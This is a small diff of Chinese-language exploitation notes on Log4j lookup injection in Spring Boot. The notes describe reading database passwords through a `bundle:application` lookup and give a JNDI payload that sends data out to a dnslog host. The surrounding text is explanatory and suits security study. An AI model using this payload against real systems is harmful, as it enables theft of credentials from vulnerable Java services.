@@ -43,7 +43,3 @@
 在`SpringBoot`情况下可以使用`bundle:application`获得数据库密码等敏感信息
 
 这些敏感信息可以利用`dnslog`外带`${jndi:ldap://${java:version}.xxx.dnslog.cn}`
-
-
-
-- 待补充
